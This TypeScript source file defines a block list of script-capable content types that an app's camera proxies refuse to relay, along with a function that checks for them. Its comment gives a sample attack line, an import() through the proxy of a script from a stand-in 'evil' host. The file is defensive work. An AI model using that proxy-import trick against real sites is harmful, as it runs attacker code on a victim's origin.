/**
 * Content types the camera proxies must never relay.
 *
 * The proxies stream a remote body back from this app's own origin under the
 * upstream's content type. If that type is a script one, the response becomes an
 * attacker-controlled ES module on this origin — `import("/api/camera/proxy/
 * iframe?url=https://evil/x.js")` would execute it. A camera feed is images,
 * video or a viewer page, so refusing script types costs nothing real.
 */
const BLOCKED_PROXY_TYPES = [
    "javascript",
    "ecmascript",
    "application/json", // JSON modules are importable too
    "application/wasm",
    "image/svg+xml", // scriptable document
];

/**
 * The two JavaScript MIME essences from the HTML spec that the substring rule
 * above does not catch — neither contains "javascript" or "ecmascript".
 */
const BLOCKED_PROXY_TYPES_EXACT = ["text/jscript", "text/livescript"];

/** True when this upstream content type must not be relayed from our origin. */
export function isUnsafeProxyContentType(contentType: string): boolean {
    const essence = contentType.split(";")[0].trim().toLowerCase();
    if (BLOCKED_PROXY_TYPES_EXACT.includes(essence)) return true;
    return BLOCKED_PROXY_TYPES.some((blocked) => essence.includes(blocked));
}
